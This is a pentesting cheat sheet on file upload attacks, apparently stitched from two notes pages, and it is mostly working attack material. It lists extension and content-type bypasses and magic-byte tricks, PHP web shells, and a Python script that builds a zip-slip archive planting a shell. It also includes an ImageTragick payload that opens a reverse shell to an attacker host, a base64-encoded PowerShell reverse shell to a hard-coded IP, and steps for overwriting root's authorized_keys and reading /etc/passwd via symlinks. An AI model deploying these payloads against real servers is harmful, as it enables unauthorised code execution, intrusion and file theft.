<li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>phps</em>, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc</em></li>
<li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li>
<li><strong>Jsp:</strong> <em>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</em></li>
<li><strong>Coldfusion:</strong> <em>.cfm, .cfml, .cfc, .dbm</em></li>
<li><strong>Flash</strong>: <em>.swf</em></li>
<li><strong>Perl</strong>: <em>.pl, .cgi</em></li>
<li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li>
</ul>
<h3 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h3>
<ol>
<li>
<p>If they apply, then check the previous extensions. Also test them using some uppercase letters: PHP, .pHP5, .PhAr ...</p>
</li>
<li>
<p>Try adding a valid extension before the execution extension (use previous extensions also):</p>
<ul>
<li>file.png.php</li>
<li>file.png.Php5</li>
</ul>
</li>
<li>
<p>Try adding special characters at the end. You could use Burp to brute-force all the ASCII and Unicode characters. (Note that you can also try to use the previously motioned extensions)</p>
<ul>
<li>file.php%20</li>
<li>file.php%0a</li>
<li>file.php%00</li>
<li>file.php%0d%0a</li>
<li>file.php/</li>
<li>file.php.\</li>
<li>file.</li>
<li>file.php....</li>
<li>file.pHp5....</li>
</ul>
</li>
<li>
<p>Try to bypass the protections by tricking the extension parser on the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.</p>
<ul>
<li>file.png.php</li>
<li>file.png.pHp5</li>
<li>file.php%00.png</li>
<li>file.php\x00.png</li>
<li>file.php%0a.png</li>
<li>file.php%0d%0a.png</li>
<li>file.phpJunk123png</li>
</ul>
</li>
<li>
<p>Add another layer of extensions to the previous check:</p>
<ul>
<li>file.png.jpg.php</li>
<li>file.php%00.png%00.jpg</li>
</ul>
</li>
<li>
<p>Try to put the exec extension before the valid extension and pray so the server is misconfigured. <strong>(useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php</strong> will execute code):</p>
<ul>
<li>ex: file.php.png</li>
</ul>
</li>
<li>
<p>Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)</p>
</li>
</ol>
<h3 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h3>
<ol>
<li>
<p>Bypass Content-Type checks by setting the value of the Content-Type header to image/png, text/plain, application/octet-stream</p>
</li>
<li>
<p>Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata:</p>
</li>
</ol>
<pre><code> exiftool -Comment="&lt;?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
</code></pre>
<ul>
<li>It is also possible that the <strong>magic bytes</strong> are just being <strong>checked</strong> in the file and you could set them <strong>anywhere in the file</strong>.</li>
</ul>
<h3 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h3>
<ul>
<li>
<p>Find a vulnerability to rename the file already uploaded (to change the extension).</p>
</li>
<li>
<p>Find a Local File Inclusion vulnerability to execute the backdoor.</p>
</li>
<li>
<p>Possible Information disclosure:</p>
<ul>
<li>Upload several times (and at the same time) the same file with the same name</li>
<li>Upload a file with the name of a file or folder that already exists</li>
<li>Uploading a file with “.”, “..”, or “…” as its name. For instance, in Apache in Windows, if the application saves the uploaded files in the “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.</li>
<li>Upload a file that may not be deleted easily such as “…:.jpg” in NTFS. (Windows)</li>
<li>Upload a file in Windows with invalid characters such as |&lt;&gt;*?” in its name. (Windows)</li>
<li>Upload a file in Windows using reserved (forbidden) names such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.</li>
</ul>
</li>
<li>
<p>Try also to upload an executable (.exe) or a .html (less suspicious) that will execute code when accidentally opened by the victim.</p>
</li>
</ul>
<h3 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h3>
<p>On some occasions, you may find that a server is using <strong><code>wget</code></strong> to <strong>download files</strong> and you can <strong>indicate</strong> the <strong>URL</strong>. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, <strong>this check can be bypassed.</strong> The <strong>maximum</strong> length of a <strong>filename</strong> in L<strong>inux</strong> is <strong>255</strong>, however, <strong>wget</strong> truncate the filenames to <strong>236</strong> characters. You can <strong>download a file called "A"*232+".php"+".gif"</strong>, this filename will <strong>bypass</strong> the <strong>check</strong> (as in this example <strong>".gif"</strong> is a <strong>valid</strong> extension) but <code>wget</code> will <strong>rename</strong> the file to <strong>"A"*232+".php"</strong>.</p>
<pre><code>#Create file and HTTP server
echo "SOMETHING" &gt; $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
</code></pre>
<pre><code>#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
The new name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================&gt;]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
</code></pre>
<p>Note that <strong>another option</strong> you may be thinking of to bypass this check is to make the <strong>HTTP server redirect to a different file</strong>, so the initial URL will bypass the check by then Wget will download the redirected file with the new name. This <strong>won't work</strong> <strong>unless</strong> the wget is being used with the <strong>parameter</strong> <code>--trust-server-names</code> because the <strong>wget will download the redirected page with the name of the file indicated in the original URL</strong>.</p>
<h3 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h3>
<ul>
<li>Set <strong>filename</strong> to <code>../../../tmp/lol.png</code> and try to achieve a <strong>path traversal</strong></li>
<li>Set <strong>filename</strong> to <code>sleep(10)-- -.jpg</code> and you may be able to achieve a <strong>SQL injection</strong></li>
<li>Set <strong>filename</strong> to <code>&lt;svg onload=alert(document.comain)&gt;</code> to achieve an XSS</li>
<li>Set <strong>filename</strong> to <code>; sleep 10;</code> to test some command injection</li>
</ul>
<p>Here’s a top 10 list of things that you can achieve by uploading (from the <a href="https://twitter.com/SalahHasoneh1/status/1281274120395685889">link</a>)</p>
<ol>
<li><strong>ASP / ASPX / PHP5 / PHP / PHP3</strong>: Webshell / RCE</li>
<li><strong>SVG</strong>: Stored XSS / SSRF / XXE</li>
<li><strong>GIF</strong>: Stored XSS / SSRF</li>
<li><strong>CSV</strong>: CSV injection</li>
<li><strong>XML</strong>: XXE</li>
<li><strong>AVI</strong>: LFI / SSRF</li>
<li><strong>HTML / JS</strong> : HTML injection / XSS / Open redirect</li>
<li><strong>PNG / JPEG</strong>: Pixel flood attack (DoS)</li>
<li><strong>ZIP</strong>: RCE via LFI / DoS</li>
<li><strong>PDF / PPTX</strong>: SSRF / BLIND XXE</li>
</ol>
<h3 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h3>
<ul>
<li><strong>PNG</strong>: <code>"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li>
<li><strong>JPG</strong>: <code>"\xff\xd8\xff"</code></li>
</ul>
<h3 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h3>
<p>If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:</p>
<h4 id="symlink"><a class="header" href="#symlink">Symlink</a></h4>
<p>Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:</p>
<pre><code>ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
</code></pre>
<h4 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h4>
<p>The decompressed files will be created in unexpected folders.</p>
<p>One could easily assume that this setup protects from OS-level command execution via malicious file uploads but unfortunately, this is not true. Since the ZIP archive format supports hierarchical compression and we can also reference higher-level directories we can escape from the safe upload directory by abusing the decompression feature of the target application.</p>
<p>An automated exploit to create this kind of files can be found here: <a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
<pre><code>python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
</code></pre>
<p>Some python code to create a malicious zip:</p>
<pre><code>#!/usr/bin/python
import zipfile
from cStringIO import StringIO 

def create_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/webserver/shell.php', '&lt;?php echo system($_REQUEST["cmd"]); ?&gt;')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()
</code></pre>
<p>To achieve remote command execution I took the following steps:</p>
<ol>
<li>Create a PHP shell:</li>
</ol>
<pre><code>&lt;?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?&gt;
</code></pre>
<ol start="2">
<li>Use “file spraying” and create a compressed zip file:</li>
</ol>
<pre><code>root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
</code></pre>
<ol start="3">
<li>Use a hex-editor or vi and change the “xxA” to “../”, I used vi:</li>
</ol>
<pre><code>:set modifiable
:%s/xxA/..\//g
:x!
</code></pre>
<p>Done!
Only one step remained: Upload the ZIP file and let the application decompress it! If it succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system:</p>
<pre><code>url/cmd.php?cmd=id
</code></pre>
<h3 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h3>
<p>Upload this content with an image extension to exploit the vulnerability <strong>(ImageMagick, 7.0.1-1)</strong></p>
<pre><code>push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
pop graphic-context
</code></pre>
<h3 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h3>
<p>The primary reason for putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this <a href="http://php.net/manual/en/function.imagecopyresized.php">imagecopyresized</a> and <a href="http://php.net/manual/en/function.imagecopyresampled.php">imagecopyresampled</a>.</p>
<p>Read this post: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
<h3 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h3>
<p>Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a <a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a> is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.</p>
<p>Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.</p>
<p>This helps to upload a file that complies with the format of several different formats. It can allow you to upload a PHAR file (PHP ARchive) that also looks like a JPEG, but probably you will still need a valid extension and if the upload function doesn't allow it this won't help you.</p>
<p>More information in: <a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p>
<h3 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h3>
<pre><code>Upload the backdoor, then:

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0...



Let’s try to overwrite the authorized_keys file in the home directory for root
ssh-keygen
fileup
cat fileup.pub &gt; authorized_keys
Now that the authorized_keys file contains our public key, we can upload it using the relative path ../../../../../../../root/.ssh/authorized_keys *Burp or Curl Put*
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload-attack"><a class="header" href="#file-upload-attack">File Upload Attack</a></h1>
<p>Last modified: 2023-11-11</p>
<p>Web</p>
<hr />
<p>It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).</p>
<h2 id="check-allowed-file-formats"><a class="header" href="#check-allowed-file-formats"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#check-allowed-file-formats">Check Allowed File Formats</a></a></h2>
<p>First off, we need to know what file types are allowed to be uploaded in target website.<br />
Try to upload any formats.</p>
<pre><code class="language-txt">.php, .php3, .php4, .php5, .phtml, .phar
.jpg, jpeg, .png, .gif
.bmp
.pdf
.js
.exe, .dll, .asp, .aspx
.py
.go
.rs
</code></pre>
<h3 id="create-blank-files-for-each-format"><a class="header" href="#create-blank-files-for-each-format"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#create-blank-files-for-each-format">Create Blank Files for Each Format</a></a></h3>
<p>To create a blank file for the checking purpose, execute the following command.</p>
<ul>
<li><strong>jpg, png</strong></li>
</ul>
<pre><code class="language-bash"># https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images
convert -size 32x32 xc:white test.jpg
convert -size 32x32 xc:white test.png
</code></pre>
<ul>
<li><strong>pdf</strong></li>
</ul>
<pre><code class="language-bash"># https://unix.stackexchange.com/questions/277892/how-do-i-create-a-blank-pdf-from-the-command-line
convert xc:none -page Letter a.pdf
</code></pre>
<h2 id="bypass-file-extension-validation"><a class="header" href="#bypass-file-extension-validation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-file-extension-validation">Bypass File Extension Validation</a></a></h2>
<p>We might be able to bypass file extension validation by modifying the filename.<br />
For example, if we cannot upload a pure <strong><code>.php</code></strong> file extension, tweak the filename a bit as below.</p>
<pre><code class="language-txt">exploit.php
exploit.php3
exploit.php4
exploit.php5
exploit.phtml
exploit.phar

exploit.jpg.php
exploit.jpeg.php
exploit.png.php
exploit.gif.php
exploit.pdf.php

exploit.php.
exploit.php.jpg
exploit.php.jpeg
exploit.php.png
exploit%2Ephp
exploit.p.phphp
exploit.php%00.jpg
exploit.php%0d%0a.jpg

exploit.PHP
exploit.pHp

exploit.php/
exploit.php//
exploit.php\
exploit.php#
exploit..php
</code></pre>
<h2 id="bypass-content-type-validation"><a class="header" href="#bypass-content-type-validation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-content-type-validation">Bypass Content-Type Validation</a></a></h2>
<p>We might be able to bypass the content type validation by modifying that.<br />
For example, assume that we want to upload <strong><code>PHP</code></strong> file to execute <strong>webshell</strong> or <strong>reverse shell</strong>, but <code>PHP</code> files are rejected by the website.<br />
In this situation, we might be able to bypass the validation by modifying the <strong>"Content-Type"</strong> from <strong>"application/x-php"</strong> to other types such as <strong>"image/jpeg"</strong>, <strong>"plain/text"</strong> etc.<br />
Here is the example.</p>
<pre><code class="language-html">------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg &lt;!-- Change this. Try other types such as image/gif, plain/text, etc. --&gt;

&lt;?php echo system($_GET['cmd']); ?&gt;

------abcdefghijk
</code></pre>
<h2 id="change-upload-location-by-filename"><a class="header" href="#change-upload-location-by-filename"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#change-upload-location-by-filename">Change Upload Location by Filename</a></a></h2>
<p>We might be able to upload our file to <strong>unintended location</strong> by path traversing with filename e.g. <strong><code>../example.php</code></strong> or <strong><code>..%2Fexample.php</code></strong>.</p>
<pre><code class="language-html">------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" &lt;!-- Change this. --&gt;
Content-Type: application/x-php

&lt;?php echo system($_GET['cmd']); ?&gt;

------abcdefghijk
</code></pre>
<h2 id="overwrite-server-configuration"><a class="header" href="#overwrite-server-configuration"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#overwrite-server-configuration">Overwrite Server Configuration</a></a></h2>
<p>We might be able to overwrite the web server configuration file such as <strong>".htaccess"</strong>, <strong>".htpasswd"</strong> by specifying the filename to the name of the config file and write desired contents of that.</p>
<pre><code class="language-html">------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess" &lt;!-- Specify the name of config file --&gt;
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
</code></pre>
<p>If you have the ability to upload files, maybe try this:</p>
<pre><code>echo "AddType application/x-httpd-php .dork" &gt; .htaccess
</code></pre>
<h2 id="magic-bytes"><a class="header" href="#magic-bytes"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes">Magic Bytes</a></a></h2>
<p>Reference: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia</a></p>
<p>If the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.</p>
<p>The <strong><code>exif_imagetype()</code></strong> PHP function is likely to be used for such validation.<br />
In addition, we may need to change other values such as <strong>"Content-Type"</strong> depending on the situation.</p>
<h3 id="png"><a class="header" href="#png"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#png">PNG</a></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
<tr><td><code>89 50 4E 47 0D 0A 1A 0A</code></td><td><code>‰PNG␍␊␚␊</code></td></tr>
</tbody></table>
</div>
<p>Payload example:</p>
<pre><code class="language-php">‰PNG␍␊␚␊
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h3 id="jpgjpeg"><a class="header" href="#jpgjpeg"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpg%2Fjpeg">JPG/JPEG</a></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
<tr><td><code>FF D8 FF EE</code></td><td><code>ÿØÿî</code></td></tr>
<tr><td><code>FF D8 FF E0</code></td><td><code>ÿØÿà</code></td></tr>
<tr><td><code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></td><td><code>ÿØÿà␀␐JFIF␀␁</code></td></tr>
</tbody></table>
</div>
<p>Payload example:</p>
<pre><code class="language-php">ÿØÿî
&lt;?php echo system($_GET['cmd']); ?&gt;

// or

ÿØÿà
&lt;?php echo system($_GET['cmd']); ?&gt;

// or

ÿØÿà␀␐JFIF␀␁
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h3 id="pdf"><a class="header" href="#pdf"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#pdf">PDF</a></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
<tr><td><code>25 50 44 46 2D</code></td><td><code>%PDF-</code></td></tr>
</tbody></table>
</div>
<p>Payload example:</p>
<pre><code class="language-php">%PDF-
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h3 id="gif"><a class="header" href="#gif"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#gif">GIF</a></a></h3>
<p>Reference: <a href="https://docstore.mik.ua/orelly/web2/wdesign/ch19_01.htm">Web Design in a Nutshell</a></p>
<ul>
<li><strong>GIF87a</strong>: The original format for indexed color images. It uses LZW compression and has the option of being interlaced.</li>
<li><strong>GIF89a</strong>: Is the same as <strong>GIF87a</strong> but also includes transparancy and animation capabilities.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
<tr><td><code>47 49 46 38 37 61</code></td><td><code>GIF87a</code></td></tr>
<tr><td><code>47 49 46 38 39 61</code></td><td><code>GIF89a</code></td></tr>
</tbody></table>
</div>
<p>Payload example:</p>
<pre><code class="language-php">GIF87a
&lt;?php echo system($_GET['cmd']); ?&gt;

// or

GIF89a
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h3 id="riff-wave"><a class="header" href="#riff-wave"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#riff-wave">RIFF WAVE</a></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
<tr><td><code>52 49 46 46 ?? ?? ?? ?? 57 41 56 45</code></td><td><code>RIFF????WAVE</code></td></tr>
</tbody></table>
</div>
<p>Payload example:</p>
<pre><code class="language-bash">RIFF????WAVE
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h2 id="zip-1"><a class="header" href="#zip-1"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip">Zip</a></a></h2>
<p>If target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and displays the result of decompressed file somewhere e.g. <code>/upload/example.txt</code>.</p>
<h3 id="zip-slip"><a class="header" href="#zip-slip"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip-slip">Zip Slip</a></a></h3>
<p>Create a file containing ‘../’ in the filename, and compress this file.</p>
<pre><code class="language-bash">echo '&lt;?php echo system("id");?&gt;' &gt; '../test.php'
zip test.zip '../test.php'
</code></pre>
<p>After uploading the zip file, target website (server) will decompress this file and may store the <code>test.php</code> file into unexpected directory.</p>
<h3 id="lfi-with-symlinks"><a class="header" href="#lfi-with-symlinks"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#lfi-with-symlinks">LFI with Symlinks</a></a></h3>
<p>In local machine, create a symbolic link for a sensitive file. Then compress the symlink with <code>zip</code>.</p>
<pre><code class="language-bash">ln -s /etc/passwd passwd.txt
zip --symlink test.zip passwd.txt
</code></pre>
<p>When we upload the zip file to target website, the website decompress the zip file and may display the file of the symbolic link (<code>/etc/passwd</code>, etc.). In short, we may be able to see the contents of the sensitive file.</p>
<h2 id="jpeg-polyglot-xss"><a class="header" href="#jpeg-polyglot-xss"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpeg-polyglot-xss">JPEG Polyglot XSS</a></a></h2>
<p>Reference: <a href="https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a">https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a</a></p>
<p>We may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.<br />
We can generate automatically a polyglot JPEG with <a href="https://github.com/s-3ntinel/imgjs_polygloter">imgjs_polygloter</a>.</p>
<p>Below is the manual exploitation flow.</p>
<h3 id="1-prepare-jpeg-image"><a class="header" href="#1-prepare-jpeg-image"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#1.-prepare-jpeg-image">1. Prepare JPEG Image</a></a></h3>
<p>Here we create a blank JPEG image using <code>convert</code> command.</p>
<pre><code class="language-bash">convert -size 100x100 xc:white evil.jpg

# Backup for reproduction
cp evil.jpg evil_original.jpg
</code></pre>
<h3 id="2-create-xss-payload-in-hex"><a class="header" href="#2-create-xss-payload-in-hex"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#2.-create-xss-payload-in-hex">2. Create XSS Payload in Hex</a></a></h3>
<p>We will insert the following JavaScript code.</p>
<pre><code class="language-bash">*/=alert("test");/*
</code></pre>
<p>To insert it into JPEG file, we need to convert this to HEX as below:</p>
<pre><code class="language-bash">2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A
</code></pre>
<h3 id="3-start-hex-editor"><a class="header" href="#3-start-hex-editor"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#3.-start-hex-editor">3. Start Hex Editor</a></a></h3>
<p>Start Hex editor to modify our <code>evil.jpg</code>. We use <code>ghex</code> here but you can use your favorite HEX editor.</p>
<pre><code class="language-bash">ghex evil.jpg
</code></pre>
<p>The original hex representation of the <code>evil.jpg</code> is as such follow:</p>
<pre><code class="language-bash">FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 ...

# Details of the Hex
# FF D8: Start of image
# FF E0: Application default header
# 00 10: The length of the JPEG header (`00 10` represents 16 bytes)
</code></pre>
